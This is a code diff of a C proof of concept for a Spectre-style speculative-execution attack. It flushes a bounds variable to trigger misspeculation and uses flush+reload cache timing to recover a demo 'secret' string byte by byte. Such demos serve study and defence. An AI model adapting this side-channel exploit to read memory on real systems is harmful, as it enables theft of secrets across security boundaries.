@@ -6,25 +6,29 @@
 #include <Windows.h>
 #include <stdlib.h>  
 
-#define NUM_READS 100  //受害者线程连续读取密码次数。
-#define PROCESSOR_AFFINITY_CORE0 1 // 假设第一个CPU核心的掩码是1  
-
+int special_attack = 1;
+char* secret = "password!";
+uint8_t known_data[10] = { 0,1,2,3,4,5,6,7,8,9 };
+uint8_t legal_size = 10;
 
 uint8_t probe_array[256][4096];
 uint64_t access_time[256];
 
-uint8_t known_data[10] = { 0,1,2,3,4,5,6,7,8,9 };
-char* secret = "password";
-
-uint8_t get_legal_char(int index)
+uint8_t visit_legal_char(size_t index)
 {
-    if (index < 10)
+    if (index < legal_size)
         return known_data[index];
     else
         return 0;
 }
 
-uint8_t Steal(int interst)
+void special_visit_legal_char(size_t index)
+{
+    if (index < legal_size)
+        probe_array[known_data[index]][0]++;
+}
+
+uint8_t Steal(size_t interst)
 {
     for (size_t retries = 0; retries < 30000; retries++)
     {
@@ -33,16 +37,31 @@ uint8_t Steal(int interst)
             _mm_clflush(&probe_array[i]);
             _mm_pause();
         }
-        for (size_t re = 0; re < 256; re++)
-        {
-            for (size_t i = 0; i < 10; i++)
-                get_legal_char(i);
-        }
         
+        for (size_t i = 0; i < 10; i++)
+        {
+            _mm_clflush((const void*)(&legal_size));
+            _mm_mfence();
+            visit_legal_char(i);
+            _mm_mfence();
+        }
 
-        uint8_t s = get_legal_char(interst);
-        probe_array[s][0]++;
-
+        if (special_attack)
+        {
+            _mm_clflush((const void*)(&legal_size));
+            _mm_mfence();
+            special_visit_legal_char(interst);
+            _mm_mfence();
+        }
+        else
+        {
+            _mm_clflush((const void*)(&legal_size));
+            _mm_mfence();
+            uint8_t s = visit_legal_char(interst);
+            probe_array[s][0]++;
+            _mm_mfence();
+        }
+       
         for (size_t i = 0; i < 256; i++)
         {
             uint32_t aux = 0;
@@ -59,7 +78,7 @@ uint8_t Steal(int interst)
             _mm_pause();
         }
 
-        if (access_time[idx_min] < 100 && idx_min != 0)
+        if (access_time[idx_min] < 100 && idx_min != 0 && idx_min >= 32 && idx_min <= 126)
         {
             printf(" => %02X retries=%-5zd access_time=%llu\n"
                 , (uint32_t)idx_min
@@ -79,7 +98,7 @@ uint8_t Steal(int interst)
 int main(int argc, char* argv[])
 {
     uint8_t buffer[10] = { 0 };
-    size_t address_gap = (size_t)(secret - (char*)known_data);
+    size_t address_gap = secret - known_data;
 
     for (size_t i = 0; i < sizeof(buffer); i++)
     {
